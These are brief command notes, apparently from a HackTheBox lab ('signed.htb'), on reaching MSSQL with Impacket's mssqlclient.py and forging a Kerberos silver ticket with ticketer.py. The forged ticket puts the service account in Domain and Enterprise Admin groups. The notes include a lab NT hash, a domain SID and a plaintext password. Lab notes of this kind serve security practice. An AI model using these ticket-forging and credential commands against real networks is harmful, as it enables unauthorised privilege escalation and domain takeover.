```
mssqlclient.py -p 1433 EXAMPLE/Administrator@DC01 -windows-auth
```

```
sudo ntpdate time.google.com
mssqlclient.py -k -no-pass dc01.signed.htb -windows-auth
ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105,512,519 -user-id 1103 mssqlsvc
```

### Kerberos
```sh
export KRB5CCNAME=.ccache
mssqlclient.py -k -no-pass DC01.SIGNED.HTB
```


if you got 
`The login is from an untrusted domain and cannot be used with Integrated authentication.`
Then give it the domain before the username
```
mssqlclient.py 'signed.htb/mssqlsvc:purPLE9795!@@10.129.123.188' -windows-auth
```